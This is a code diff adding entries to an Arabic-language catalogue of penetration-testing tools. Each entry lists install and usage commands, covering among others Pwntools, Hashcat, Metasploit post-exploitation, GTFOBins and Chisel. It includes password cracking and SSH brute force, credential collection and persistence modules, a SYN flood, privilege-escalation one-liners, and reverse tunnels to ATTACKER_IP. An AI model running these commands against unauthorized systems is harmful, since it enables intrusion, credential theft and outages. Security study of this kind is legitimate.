+    { cmd: '# Recipe:\nFrom Base64 → From Hex → XOR({key: \'41\'})', note: 'تسلسل عمليات متعددة' },
+  ],
+  tips: ['💡 Magic Operation تخمن تلقائياً نوع الترميز', '💡 Save Recipe لإعادة استخدام التحليل'],
+  related: ['Hashcat', 'John', 'strings', 'xxd'],
+},
+{
+  id: 68, name: 'Pwntools', icon: '⚙️', color: 'rgba(200,0,200,0.12)',
+  short: 'إطار تطوير Exploits بـ Python',
+  cat: 'exploitation', tags: ['exploitation','ctf'],
+  desc: `Pwntools مكتبة Python لتطوير Exploits وحل تحديات CTF Pwn. توفر: اتصالات TCP/UDP، تحليل Binary (ELF, PE)، ROP Chain generation، Shellcode Assembly، GDB Integration.`,
+  features: ['ELF وPE Analysis', 'ROP Chain Builder', 'Shellcode Assembly', 'Cyclic Pattern', 'GDB Integration (pwndbg)', 'SSH/Netcat Connections'],
+  install: 'pip3 install pwntools',
+  version: 'python3 -c "import pwn; print(pwn.__version__)"',
+  commands: [
+    { cmd: 'from pwn import *\np = process("./vuln")\np.sendline(b"A" * 100)\np.interactive()', note: 'اتصال بـ Process محلي' },
+    { cmd: 'from pwn import *\nprint(cyclic(200))\nprint(cyclic_find(0x61616166))', note: 'توليد وتحليل Cyclic Pattern' },
+    { cmd: 'elf = ELF("./binary")\nrop = ROP(elf)\nrop.execve(next(elf.search(b"/bin/sh")), 0, 0)', note: 'ROP Chain تلقائي' },
+    { cmd: 'from pwn import *\nsh = shellcraft.amd64.linux.sh()\nprint(asm(sh, arch="amd64").hex())', note: 'توليد Linux Shellcode' },
+  ],
+  tips: ['💡 context.arch = "amd64" أو "i386" لتحديد البنية', '💡 gdb.attach(p) لربط GDB أثناء التشغيل'],
+  related: ['GDB', 'ROPgadget', 'Ghidra', 'radare2'],
+},
+{
+  id: 69, name: 'Hashcat (Advanced)', icon: '⚡', color: 'rgba(255,200,50,0.12)',
+  short: 'كسر كلمات المرور بـ GPU',
+  cat: 'password', tags: ['password'],
+  desc: `Hashcat أسرع أداة كسر كلمات مرور في العالم. تستخدم GPU للوصول لمليارات المحاولات في الثانية. تدعم 300+ نوع Hash: MD5, SHA, NTLM, bcrypt, WPA2, وغيرها.`,
+  features: ['GPU Acceleration (أسرع 10-100x)', 'Dictionary, Brute Force, Hybrid, Rule', 'استئناف من حيث توقف', 'Word Rules ذكية (best64.rule)', 'Distributed Cracking'],
+  install: 'sudo apt install hashcat -y',
+  version: 'hashcat --version',
+  commands: [
+    { cmd: 'hashcat -m 0 hashes.txt rockyou.txt', note: 'MD5 Dictionary Attack' },
+    { cmd: 'hashcat -m 1000 ntlm.txt rockyou.txt', note: 'NTLM Hash Cracking' },
+    { cmd: 'hashcat -m 22000 wpa2.hc22000 rockyou.txt', note: 'WPA2 Password Cracking' },
+    { cmd: 'hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule', note: 'Dictionary + Rules Attack' },
+    { cmd: 'hashcat -m 0 hash.txt -a 3 ?u?l?l?l?l?d?d', note: 'Mask Attack (Pattern محدد)' },
+  ],
+  tips: ['💡 --show لعرض الكلمات المكسورة بعد الانتهاء', '💡 hashcat -b لقياس سرعة GPU'],
+  related: ['John the Ripper', 'Ophcrack', 'L0phtCrack'],
+},
+{
+  id: 70, name: 'Dirsearch', icon: '📂', color: 'rgba(0,255,200,0.12)',
+  short: 'فحص المجلدات والملفات بـ Python',
+  cat: 'webapp', tags: ['webapp','scanning'],
+  desc: `Dirsearch أداة Python قوية لاكتشاف المجلدات والملفات المخفية على خوادم الويب. سهلة الاستخدام مع قوائم افتراضية شاملة ودعم Proxy وTLS.`,
+  features: ['قوائم Wordlist مدمجة', 'فحص الامتدادات', 'Recursive Scanning', 'Color-coded Output', 'Resume من نقطة التوقف'],
+  install: 'sudo apt install dirsearch -y',
+  version: 'dirsearch --version',
+  commands: [
+    { cmd: 'dirsearch -u http://target.com -e php,asp,aspx', note: 'فحص امتدادات محددة' },
+    { cmd: 'dirsearch -u http://target.com -r', note: 'فحص تكراري (Recursive)' },
+    { cmd: 'dirsearch -u http://target.com -w /path/to/wordlist.txt', note: 'قاموس مخصص' },
+    { cmd: 'dirsearch -l urls.txt -e php -o results.txt', note: 'فحص قائمة URLs' },
+  ],
+  tips: ['💡 -t لعدد الـ Threads (افتراضي 25)', '💡 --random-agent لتغيير User-Agent تلقائياً'],
+  related: ['Gobuster', 'ffuf', 'Feroxbuster'],
+},
+{
+  id: 71, name: 'Netdiscover', icon: '📡', color: 'rgba(0,200,100,0.12)',
+  short: 'اكتشاف الأجهزة الحية على الشبكة المحلية',
+  cat: 'scanning', tags: ['scanning','network'],
+  desc: `Netdiscover أداة لاكتشاف الأجهزة الحية على الشبكة المحلية باستخدام ARP. مفيدة في الـ Labs والشبكات المحلية حيث لا يعمل nmap -sn دائماً.`,
+  features: ['ARP-based Discovery', 'واجهة نصية تفاعلية', 'Passive Mode (بدون إرسال)', 'عرض IP, MAC, Vendor', 'سريع على الشبكات الصغيرة'],
+  install: 'sudo apt install netdiscover -y',
+  version: 'netdiscover -h',
+  commands: [
+    { cmd: 'sudo netdiscover -r 192.168.1.0/24', note: 'مسح شبكة محلية' },
+    { cmd: 'sudo netdiscover -i eth0', note: 'مسح تلقائي على الواجهة' },
+    { cmd: 'sudo netdiscover -p -r 192.168.1.0/24', note: 'Passive Mode (أهدأ)' },
+  ],
+  tips: ['💡 -p للـ Passive Mode: يستمع فقط دون إرسال', '💡 الـ Vendor يساعد في التعرف على نوع الجهاز'],
+  related: ['Nmap', 'arp-scan', 'masscan'],
+},
+{
+  id: 72, name: 'Metasploit (Post-Ex)', icon: '🎪', color: 'rgba(255,0,150,0.12)',
+  short: 'Post-Exploitation Modules في Metasploit',
+  cat: 'exploitation', tags: ['exploitation'],
+  desc: `Metasploit Post-Exploitation Modules تُستخدم بعد الحصول على Shell. تشمل: جمع المعلومات، سرقة Credentials، Persistence، Pivoting، وتصعيد الصلاحيات.`,
+  features: ['200+ Post-Ex Module', 'Pivoting وRouting', 'جمع Credentials', 'Persistence Setup', 'Local Exploit Suggester'],
+  install: '# مدمج مع Metasploit Framework',
+  version: 'msfconsole --version',
+  commands: [
+    { cmd: 'run post/multi/recon/local_exploit_suggester', note: 'اقتراح Exploits محلية' },
+    { cmd: 'run post/windows/gather/credentials/credential_collector', note: 'جمع كل Credentials' },
+    { cmd: 'run post/linux/gather/enum_system', note: 'فحص Linux بعد الاختراق' },
+    { cmd: 'run post/windows/manage/persistence_exe STARTUP=SCHEDULER LHOST=IP', note: 'تثبيت Persistence' },
+    { cmd: 'use post/multi/manage/autoroute\nset SESSION 1\nrun', note: 'إعداد Pivoting Routes' },
+  ],
+  tips: ['💡 local_exploit_suggester أول module تشغّله بعد الدخول', '💡 sessions -u لترقية Shell لـ Meterpreter'],
+  related: ['Meterpreter', 'msfvenom', 'Cobalt Strike'],
+},
+{
+  id: 73, name: 'ARP-scan', icon: '🔭', color: 'rgba(0,200,200,0.12)',
+  short: 'مسح الشبكة المحلية بـ ARP Requests',
+  cat: 'scanning', tags: ['scanning','network'],
+  desc: `arp-scan أداة سريعة لمسح الشبكة المحلية وإيجاد الأجهزة باستخدام ARP. أسرع من Nmap للشبكات المحلية. تعرض IP, MAC, وVendor.`,
+  features: ['مسح سريع جداً', 'عرض MAC Vendor', 'دعم VLAN tagging', 'إرسال ARP لـ Broadcast'],
+  install: 'sudo apt install arp-scan -y',
+  version: 'arp-scan --version',
+  commands: [
+    { cmd: 'sudo arp-scan -l', note: 'مسح الشبكة المحلية تلقائياً' },
+    { cmd: 'sudo arp-scan 192.168.1.0/24 -I eth0', note: 'مسح نطاق محدد' },
+    { cmd: 'sudo arp-scan --localnet --ignoredups', note: 'تجاهل الاستجابات المكررة' },
+  ],
+  tips: ['💡 arp-scan -l الأسرع لاكتشاف الأجهزة المحلية', '💡 أكثر موثوقية من ping في الـ LAN'],
+  related: ['Netdiscover', 'Nmap', 'netstat'],
+},
+{
+  id: 74, name: 'OpenSSL', icon: '🔑', color: 'rgba(200,200,0,0.12)',
+  short: 'اختبار TLS/SSL يدوياً وتحليل الشهادات',
+  cat: 'network', tags: ['network','scanning'],
+  desc: `OpenSSL مكتبة وأداة سطر أوامر لاختبار TLS/SSL يدوياً. يمكنها: اختبار نسخ TLS المدعومة، Cipher Suites، فحص الشهادات، تشفير وفك تشفير البيانات.`,
+  features: ['اتصال TLS يدوي', 'فحص الشهادات', 'توليد المفاتيح والشهادات', 'اختبار Cipher Suites', 'فحص ثغرات TLS'],
+  install: 'sudo apt install openssl -y',
+  version: 'openssl version',
+  commands: [
+    { cmd: 'openssl s_client -connect target.com:443', note: 'اتصال TLS مباشر' },
+    { cmd: 'openssl s_client -connect target.com:443 -tls1', note: 'اختبار TLS 1.0' },
+    { cmd: 'openssl x509 -in cert.pem -text -noout', note: 'عرض تفاصيل شهادة' },
+    { cmd: 'openssl s_client -cipher RC4 -connect target.com:443', note: 'اختبار RC4 Cipher' },
+    { cmd: 'openssl req -new -newkey rsa:2048 -nodes -keyout key.pem -out csr.pem', note: 'توليد CSR' },
+  ],
+  tips: ['💡 testssl.sh أشمل لاختبار TLS من OpenSSL مباشرة', '💡 openssl verify للتحقق من سلسلة الشهادات'],
+  related: ['testssl.sh', 'sslscan', 'sslyze'],
+},
+{
+  id: 75, name: 'Tcpdump', icon: '🎣', color: 'rgba(100,150,200,0.12)',
+  short: 'التقاط وتحليل حزم الشبكة من سطر الأوامر',
+  cat: 'network', tags: ['network','forensics'],
+  desc: `tcpdump أداة سطر أوامر لالتقاط وتحليل حزم الشبكة. مثل Wireshark لكن بدون واجهة. مثالي للخوادم والـ Remote Analysis. يدعم BPF filters قوية.`,
+  features: ['التقاط الحزم في الوقت الفعلي', 'BPF Filters قوية', 'حفظ pcap للتحليل لاحقاً', 'عرض محتوى الحزم', 'يعمل على الخوادم بدون GUI'],
+  install: 'sudo apt install tcpdump -y',
+  version: 'tcpdump --version',
+  commands: [
+    { cmd: 'sudo tcpdump -i eth0', note: 'التقاط حزم على واجهة eth0' },
+    { cmd: 'sudo tcpdump -i eth0 -w capture.pcap', note: 'حفظ في ملف pcap' },
+    { cmd: 'sudo tcpdump -i eth0 port 80 and host 192.168.1.10', note: 'فلترة بـ Port وHost' },
+    { cmd: 'sudo tcpdump -i eth0 "tcp[tcpflags] & tcp-syn != 0"', note: 'التقاط SYN Packets فقط' },
+    { cmd: 'tcpdump -r capture.pcap -A | grep -i "password"', note: 'تحليل ملف pcap' },
+  ],
+  tips: ['💡 -nn لمنع DNS Lookup (أسرع)', '💡 -v أو -vv لتفاصيل أكثر'],
+  related: ['Wireshark', 'tshark', 'NetworkMiner'],
+},
+{
+  id: 76, name: 'Enum4linux', icon: '📋', color: 'rgba(255,100,100,0.12)',
+  short: 'استخراج معلومات SMB وSamba بشكل كامل',
+  cat: 'scanning', tags: ['scanning','network','windows'],
+  desc: `Enum4linux أداة لـ Enumeration شامل على Samba/Windows systems. تستخرج: مستخدمين، مجموعات، Shares، معلومات النطاق، Policy كلمات المرور. أساسية في اختبار Windows.`,
+  features: ['استخراج قائمة المستخدمين', 'فحص الـ Shares', 'معلومات النطاق', 'Password Policy', 'اختبار Null Session', 'معلومات OS'],
+  install: 'sudo apt install enum4linux -y',
+  version: 'enum4linux',
+  commands: [
+    { cmd: 'enum4linux -a 192.168.1.10', note: 'فحص شامل (-a = all)' },
+    { cmd: 'enum4linux -u "" -p "" 192.168.1.10', note: 'Null Session (بدون credentials)' },
+    { cmd: 'enum4linux -U 192.168.1.10', note: 'قائمة المستخدمين فقط' },
+    { cmd: 'enum4linux -S 192.168.1.10', note: 'قائمة الـ Shares فقط' },
+  ],
+  tips: ['💡 enum4linux-ng نسخة محدثة بلغة Python', '💡 Null Session يعمل على Windows القديمة دون مصادقة'],
+  related: ['smbclient', 'rpcclient', 'CrackMapExec'],
+},
+{
+  id: 77, name: 'Hping3', icon: '🏓', color: 'rgba(255,150,0,0.12)',
+  short: 'إرسال حزم TCP/IP مخصصة للاختبار',
+  cat: 'network', tags: ['network','scanning'],
+  desc: `hping3 أداة لإرسال حزم TCP/IP مخصصة. تُستخدم لـ Port Scanning، Firewall Testing، OS Fingerprinting، Traceroute، DOS Testing. تدعم TCP, UDP, ICMP, RAW-IP.`,
+  features: ['إرسال حزم TCP/UDP/ICMP مخصصة', 'اختبار Firewall Rules', 'OS Fingerprinting', 'Traceroute متقدم', 'Spoofing الـ Source IP'],
+  install: 'sudo apt install hping3 -y',
+  version: 'hping3 --version',
+  commands: [
+    { cmd: 'sudo hping3 -S -p 80 target.com', note: 'SYN Ping على Port 80' },
+    { cmd: 'sudo hping3 -S --scan 1-1000 target.com', note: 'Port Scan بـ SYN' },
+    { cmd: 'sudo hping3 --icmp target.com -c 5', note: 'ICMP Ping' },
+    { cmd: 'sudo hping3 -S -p 80 --flood target.com', note: 'SYN Flood (DOS Test)', },
+    { cmd: 'sudo hping3 -1 -T --traceroute target.com', note: 'Traceroute بـ ICMP' },
+  ],
+  tips: ['⚠️ --flood للاختبار فقط على أجهزتك', '💡 -a FAKE_IP لـ Source IP Spoofing'],
+  related: ['Nmap', 'Scapy', 'tcpdump'],
+},
+{
+  id: 78, name: 'Medusa', icon: '🐍', color: 'rgba(100,200,0,0.12)',
+  short: 'Brute Force سريع ومتوازي للخدمات الشبكية',
+  cat: 'password', tags: ['password','network'],
+  desc: `Medusa أداة Brute Force متوازية تدعم SSH, FTP, HTTP, SMB, MySQL, POP3, وغيرها. في بعض الحالات أسرع من Hydra وتدعم Multiple Hosts في آن واحد.`,
+  features: ['20+ Module للبروتوكولات', 'هجمات متوازية (Multi-threading)', 'دعم Multiple Hosts', 'Log الهجمات', 'Resume من حيث توقف'],
+  install: 'sudo apt install medusa -y',
+  version: 'medusa -h | head',
+  commands: [
+    { cmd: 'medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh', note: 'Brute Force SSH' },
+    { cmd: 'medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ftp', note: 'Brute Force FTP' },
+    { cmd: 'medusa -H hosts.txt -u admin -P passwords.txt -M http -t 10', note: 'Multiple Hosts' },
+  ],
+  tips: ['💡 -t للـ Threads المتزامنة', '💡 -M http -m FORM-DATA لاختبار نماذج ويب'],
+  related: ['Hydra', 'Ncrack', 'Patator'],
+},
+{
+  id: 79, name: 'smbclient', icon: '📁', color: 'rgba(0,150,255,0.12)',
+  short: 'الوصول لمشاركات SMB/Samba',
+  cat: 'network', tags: ['network','scanning'],
+  desc: `smbclient أداة سطر أوامر للوصول لمشاركات SMB/Samba مثل FTP Client. تستعرض الـ Shares وترفع/تنزل الملفات. مفيدة لاختبار Anonymous Access والوصول المصادق على SMB.`,
+  features: ['تصفح Shares مثل FTP', 'رفع وتنزيل الملفات', 'Anonymous Access', 'Pass-the-Hash Support', 'عرض قائمة الـ Shares'],
+  install: 'sudo apt install smbclient -y',
+  version: 'smbclient --version',
+  commands: [
+    { cmd: 'smbclient -L //192.168.1.10 -N', note: 'قائمة الـ Shares بدون كلمة مرور' },
+    { cmd: 'smbclient //192.168.1.10/share -N', note: 'اتصال Anonymous بـ Share' },
+    { cmd: 'smbclient //192.168.1.10/share -U admin%password', note: 'اتصال مصادق' },
+    { cmd: '# داخل smbclient:\nls\nget secret.txt\nput local.txt', note: 'استعراض ورفع وتنزيل' },
+  ],
+  tips: ['💡 -U "" بدلاً من -N في بعض الأنظمة', '💡 smbget لتنزيل ملفات مباشرة بدون دخول تفاعلي'],
+  related: ['Enum4linux', 'CrackMapExec', 'rpcclient'],
+},
+{
+  id: 80, name: 'mitmproxy', icon: '🔀', color: 'rgba(0,200,150,0.12)',
+  short: 'MITM Proxy للاعتراض والتعديل',
+  cat: 'network', tags: ['network','webapp'],
+  desc: `mitmproxy Proxy مفتوح المصدر لاعتراض وتعديل HTTP/HTTPS. يأتي بثلاثة واجهات: mitmproxy (TUI), mitmweb (Web), mitmdump (CLI). مفيد لـ Mobile Apps والـ APIs.`,
+  features: ['اعتراض HTTP وHTTPS', 'تعديل Requests وResponses', 'Scripting بـ Python', 'Web UI جميل', 'SSL Certificate تلقائي', 'تسجيل الجلسات'],
+  install: 'pip3 install mitmproxy',
+  version: 'mitmproxy --version',
+  commands: [
+    { cmd: 'mitmproxy -p 8080', note: 'تشغيل mitmproxy TUI' },
+    { cmd: 'mitmweb -p 8080', note: 'تشغيل Web UI' },
+    { cmd: 'mitmdump -p 8080 -w traffic.log', note: 'تسجيل Traffic' },
+    { cmd: 'mitmproxy --set block_global=false -p 8080', note: 'تفعيل الوصول من الخارج' },
+  ],
+  tips: ['💡 ثبّت mitmproxy CA Certificate للاعتراض HTTPS', '💡 Addons بـ Python لتعديل أو حظر Requests'],
+  related: ['Burp Suite', 'ZAP', 'Charles Proxy'],
+},
+{
+  id: 81, name: 'GHDB (Google Hacking)', icon: '🔍', color: 'rgba(255,200,0,0.12)',
+  short: 'Google Dorks لإيجاد معلومات حساسة',
+  cat: 'recon', tags: ['recon','osint'],
+  desc: `Google Hacking Database (GHDB) مجموعة من Google Dorks لإيجاد: ملفات حساسة مكشوفة، صفحات Admin، قواعد بيانات، logs، ملفات إعداد على الإنترنت. مفيدة جداً في OSINT وBug Bounty.`,
+  features: ['Dorks لإيجاد Admin Pages', 'ملفات Configs وEnv', 'قواعد بيانات مكشوفة', 'Logs وBackup files', 'Cameras وIoT المكشوفة', 'شهادات وKeys'],
+  install: '# لا يحتاج تثبيت — يعمل في Google\n# قاعدة البيانات:\n# https://www.exploit-db.com/google-hacking-database',
+  version: '# Web-based',
+  commands: [
+    { cmd: 'site:target.com filetype:env', note: 'إيجاد ملفات .env المكشوفة' },
+    { cmd: 'site:target.com inurl:admin intitle:"login"', note: 'إيجاد صفحات Admin' },
+    { cmd: '"target.com" filetype:sql OR filetype:db', note: 'إيجاد قواعد بيانات' },
+    { cmd: 'site:target.com ext:log OR ext:bak', note: 'إيجاد ملفات Logs وBackups' },
+    { cmd: '"password" site:github.com "target.com"', note: 'إيجاد Credentials في GitHub' },
+  ],
+  tips: ['💡 dork: "index of" site:target.com لعرض مجلدات مفتوحة', '💡 غيّر target.com لنطاق هدفك في كل Dork'],
+  related: ['Shodan', 'Censys', 'theHarvester'],
+},
+{
+  id: 82, name: 'Frida', icon: '🎭', color: 'rgba(255,50,150,0.12)',
+  short: 'Dynamic Instrumentation للتطبيقات',
+  cat: 'exploitation', tags: ['exploitation','mobile'],
+  desc: `Frida إطار Dynamic Instrumentation. يُحقن JavaScript في التطبيقات (Android, iOS, Windows, Linux) لتعديل سلوكها. يُستخدم لـ SSL Pinning Bypass, Root Detection Bypass, اعتراض Function Calls.`,
+  features: ['SSL Pinning Bypass', 'Root Detection Bypass', 'Function Hooking', 'يعمل مع Android وiOS وWindows', 'Scripting بـ JavaScript وPython'],
+  install: 'pip3 install frida-tools frida',
+  version: 'frida --version',
+  commands: [
+    { cmd: 'frida -U -n com.target.app', note: 'الاتصال بـ App جاري' },
+    { cmd: 'frida -U -n com.target.app -l ssl_bypass.js', note: 'تحميل Script تلقائياً' },
+    { cmd: 'frida-ps -U', note: 'قائمة التطبيقات الجارية على الجهاز' },
+    { cmd: 'frida-trace -U -n com.target.app -i "SSL*"', note: 'تتبع SSL Functions' },
+  ],
+  tips: ['💡 Frida Scripts Library: github.com/sensepost/objection', '💡 objection أسهل طريقة لـ SSL Pinning Bypass'],
+  related: ['objection', 'APKTool', 'jadx', 'MobSF'],
+},
+{
+  id: 83, name: 'Objection', icon: '📲', color: 'rgba(100,200,255,0.12)',
+  short: 'اختبار تطبيقات Mobile بدون Jailbreak',
+  cat: 'exploitation', tags: ['exploitation','mobile'],
+  desc: `Objection أداة Runtime Mobile Exploration تعتمد على Frida. تتيح اختبار تطبيقات Android وiOS بدون Jailbreak أو Root. تدعم: SSL Pinning Bypass، Root Detection Bypass، اكتشاف ملفات وقواعد البيانات.`,
+  features: ['SSL Pinning Bypass تلقائي', 'Root/Jailbreak Detection Bypass', 'استعراض الملفات والـ SharedPreferences', 'SQLite Database Browser', 'لا يحتاج Root في أغلب الحالات'],
+  install: 'pip3 install objection',
+  version: 'objection --version',
+  commands: [
+    { cmd: 'objection -g com.target.app explore', note: 'بدء استكشاف التطبيق' },
+    { cmd: '# داخل objection:\nandroid sslpinning disable', note: 'تعطيل SSL Pinning' },
+    { cmd: 'android root disable', note: 'تجاوز Root Detection' },
+    { cmd: 'android heap search instances com.target.AuthManager', note: 'البحث عن Objects في الذاكرة' },
+  ],
+  tips: ['💡 objection patchapk -s app.apk لـ Patch APK بدون Root', '💡 ios certificates list لعرض شهادات iOS'],
+  related: ['Frida', 'MobSF', 'APKTool'],
+},
+{
+  id: 84, name: 'Burp Suite Scanner', icon: '🤖', color: 'rgba(200,100,255,0.12)',
+  short: 'الفحص التلقائي للثغرات في Burp Pro',
+  cat: 'webapp', tags: ['webapp','scanning'],
+  desc: `Burp Suite Active Scanner يفحص تلقائياً تطبيقات الويب للكشف عن: SQLi, XSS, XXE, SSRF, Path Traversal, Deserialization, وغيرها. متوفر في Burp Pro (~449$/سنة).`,
+  features: ['اكتشاف 100+ نوع ثغرة', 'Out-of-band vulnerability detection', 'Burp Collaborator Integration', 'Crawling وFuzzing تلقائي', 'تقارير HTML وXML'],
+  install: '# Burp Suite Professional\n# تنزيل: https://portswigger.net/burp/professional',
+  version: '# GUI Tool',
+  commands: [
+    { cmd: '# في Burp Pro:\n# Dashboard → New Scan\n# أو:\n# Target → Site Map → Scan', note: 'بدء Active Scan' },
+    { cmd: '# Scan Configuration:\n# Audit Checks: استخدم "Audit checks - all insights"\n# Crawl: Medium depth', note: 'إعدادات الفحص' },
+    { cmd: '# تصدير التقرير:\n# Scanner → Issues → Report Issues\n# HTML أو XML', note: 'تصدير تقرير الثغرات' },
+  ],
+  tips: ['💡 Burp Community لا يدعم Active Scanner', '💡 OWASP ZAP بديل مجاني يدعم Active Scanner'],
+  related: ['OWASP ZAP', 'Nikto', 'Nuclei', 'Acunetix'],
+},
+{
+  id: 85, name: 'GTFOBins', icon: '📜', color: 'rgba(255,200,100,0.12)',
+  short: 'قائمة Binaries لرفع الصلاحيات على Linux',
+  cat: 'exploitation', tags: ['exploitation','linux','privesc'],
+  desc: `GTFOBins (Get The F*** Off Bins) قاعدة بيانات توثّق كيفية استغلال Binary files عادية لرفع الصلاحيات، كسر القيود، أو تنفيذ أوامر. أساسي في Linux Privilege Escalation.`,
+  features: ['500+ Binary موثّق', 'Sudo, SUID, Capabilities, Cron', 'Reverse Shell, File Read/Write', 'Shell Escalation', 'بحث سريع عبر الموقع'],
+  install: '# https://gtfobins.github.io\n# لا يحتاج تثبيت',
+  version: '# Web-based Database',
+  commands: [
+    { cmd: '# SUID find:\nfind / -perm -u=s -type f 2>/dev/null\n# ابحث في gtfobins عن كل نتيجة', note: 'إيجاد SUID Binaries' },
+    { cmd: '# مثال: find مع SUID:\nfind . -exec /bin/bash -p \\;\n# مثال: python مع SUID:\npython3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"', note: 'استغلال SUID' },
+    { cmd: '# sudo -l → مثال: vim:\nsudo vim -c ":!bash"', note: 'استغلال sudo Binary' },
+    { cmd: '# Capabilities:\ngetcap -r / 2>/dev/null\n# python3 مع cap_setuid:\npython3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"', note: 'استغلال Linux Capabilities' },
+  ],
+  tips: ['💡 sudo -l أول أمر بعد الدخول لأي نظام Linux', '💡 LOLBAS نظير GTFOBins على Windows'],
+  related: ['LinPEAS', 'LOLBAS', 'HackTricks'],
+},
+// ===== TOOLS 86-100 =====
+{
+  id: 86, name: 'Amass', icon: '🌐', color: 'rgba(0,180,255,0.12)',
+  short: 'أداة OSINT متكاملة لاكتشاف الأصول الرقمية',
+  cat: 'recon', tags: ['recon','osint','scanning'],
+  desc: `Amass من OWASP هي أداة شاملة لاكتشاف Attack Surface. تجمع Subdomains، IPs، ASNs، Certificates من عشرات المصادر. تدعم Active وPassive Enum وتبني Graph قابل للاستعراض.`,
+  features: ['Passive + Active Enumeration', 'ربط الأصول في Graph', '50+ مصدر بيانات', 'تحديث Continuous للأصول', 'دعم API Keys لنتائج أكثر'],
+  install: 'sudo apt install amass -y',
+  version: 'amass -version',
+  commands: [
+    { cmd: 'amass enum -passive -d target.com', note: 'اكتشاف سلبي (Passive)' },
+    { cmd: 'amass enum -active -d target.com', note: 'اكتشاف نشط (Active)' },
+    { cmd: 'amass enum -d target.com -o subs.txt', note: 'حفظ النتائج' },
+    { cmd: 'amass intel -org "Target Corp"', note: 'اكتشاف ASN والأصول للشركة' },
+    { cmd: 'amass db -show -d target.com', note: 'عرض نتائج من قاعدة البيانات المحلية' },
+  ],
+  tips: ['💡 amass enum -config config.ini لاستخدام API Keys', '⚠️ Active Enum يترك آثاراً على الهدف'],
+  related: ['Subfinder', 'theHarvester', 'Recon-ng'],
+},
+{
+  id: 87, name: 'Nuclei', icon: '⚛️', color: 'rgba(255,100,50,0.12)',
+  short: 'فحص الثغرات المتكرر بـ Templates قابلة للتخصيص',
+  cat: 'scanning', tags: ['scanning','webapp','recon'],
+  desc: `Nuclei من ProjectDiscovery أسرع أداة فحص ثغرات قائمة على Templates. مجتمع ضخم يكتب Templates للـ CVEs الجديدة. تفحص آلاف الـ Endpoints في دقائق.`,
+  features: ['9000+ Template جاهز', 'CVEs الحديثة فوراً', 'Custom Templates سهلة الكتابة', 'Pipeline مع أدوات أخرى', 'Fast وLow False Positives'],
+  install: 'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',
+  version: 'nuclei -version',
+  commands: [
+    { cmd: 'nuclei -u https://target.com', note: 'فحص شامل بكل Templates' },
+    { cmd: 'nuclei -u https://target.com -t cves/ -severity critical,high', note: 'CVEs الخطيرة فقط' },
+    { cmd: 'nuclei -l urls.txt -t exposures/ -o results.txt', note: 'فحص قائمة URLs' },
+    { cmd: 'nuclei -u https://target.com -t misconfiguration/', note: 'فحص Misconfigurations' },
+    { cmd: 'nuclei -update-templates', note: 'تحديث Templates' },
+  ],
+  tips: ['💡 nuclei -t custom/ لاستخدام Templates مخصصة', '💡 -rate-limit 10 لتجنب الـ Rate Limiting'],
+  related: ['Nmap', 'Nikto', 'Burp Suite'],
+},
+{
+  id: 88, name: 'Chisel', icon: '🔗', color: 'rgba(150,100,255,0.12)',
+  short: 'HTTP/HTTPS Tunneling سريع عبر الجدران النارية',
+  cat: 'network', tags: ['network','exploitation','pivoting'],
+  desc: `Chisel أداة Go لإنشاء TCP Tunnels عبر HTTP/HTTPS. مفيدة عندما يُسمح فقط بحركة الويب. تعمل كـ SOCKS Proxy أو Port Forwarder. تُستخدم كثيراً في Pivoting.`,
+  features: ['HTTP/HTTPS Tunneling', 'SOCKS5 Proxy', 'Reverse Tunneling', 'TLS Encryption', 'Cross-platform (Go)'],
+  install: '# تحميل من: https://github.com/jpillora/chisel/releases\nchmod +x chisel',
+  version: './chisel --version',
+  commands: [
+    { cmd: '# Server (المهاجم):\n./chisel server -p 8080 --reverse', note: 'تشغيل Chisel Server' },
+    { cmd: '# Client (الضحية):\n./chisel client ATTACKER_IP:8080 R:1080:socks', note: 'إنشاء SOCKS Proxy عكسي' },
+    { cmd: '# Port Forward:\n./chisel client ATTACKER_IP:8080 R:4444:INTERNAL_IP:80', note: 'Port Forwarding' },
+    { cmd: '# استخدام SOCKS Proxy:\nproxychains nmap -sT -Pn INTERNAL_IP', note: 'استخدام النفق' },
+  ],
+  tips: ['💡 --tls يُشفّر الاتصال', '💡 يعمل حتى مع Corporate Firewalls التي تسمح بـ HTTP فقط'],
+  related: ['Ligolo-ng', 'SSH Tunneling', 'Proxychains'],
+},
+{
+  id: 89, name: 'Frida', icon: '💉', color: 'rgba(255,200,50,0.12)',
+  short: 'Dynamic Instrumentation لتطبيقات Mobile وDesktop',
+  cat: 'exploitation', tags: ['exploitation','mobile','reversing'],
+  desc: `Frida إطار Dynamic Instrumentation يتيح حقن JavaScript في تطبيقات Android/iOS/Windows/Linux أثناء التشغيل. يُستخدم لتجاوز SSL Pinning وRoot Detection وتحليل السلوك.`,
+  features: ['Hooking أي دالة أثناء التشغيل', 'SSL Pinning Bypass', 'Root/Jailbreak Detection Bypass', 'Cross-platform', 'Script بـ JavaScript'],
+  install: 'pip3 install frida-tools',
+  version: 'frida --version',
+  commands: [
+    { cmd: 'frida -U -f com.target.app', note: 'تشغيل وحقن في تطبيق Android' },
+    { cmd: 'frida -U -f com.target.app -l bypass_ssl.js', note: 'تجاوز SSL Pinning' },
+    { cmd: 'frida-trace -U -f com.target.app -i "open"', note: 'تتبع استدعاءات دالة' },
+    { cmd: 'frida-ps -U', note: 'قائمة العمليات الجارية على الجهاز' },
+    { cmd: '# Hook مثال:\nJava.perform(function() {\n  var SSL = Java.use("javax.net.ssl.HttpsURLConnection");\n  SSL.setDefaultHostnameVerifier.implementation = function() {};\n});', note: 'Bypass SSL بـ JavaScript' },
+  ],
+  tips: ['💡 objection مبني على Frida وأسهل للاستخدام', '💡 frida-server يجب تشغيله على الجهاز (يحتاج Root/Jailbreak)'],
+  related: ['objection', 'apktool', 'jadx'],
+},
+{
+  id: 90, name: 'Impacket', icon: '📦', color: 'rgba(200,100,0,0.12)',
+  short: 'مكتبة Python لبروتوكولات الشبكة وActive Directory',
+  cat: 'exploitation', tags: ['exploitation','active-directory','network'],
+  desc: `Impacket مجموعة أدوات Python للتفاعل مع بروتوكولات الشبكة على مستوى منخفض. تحتوي أدوات لـ SMB، LDAP، Kerberos، WMI، DCOM. أساسية في اختبار Active Directory.`,
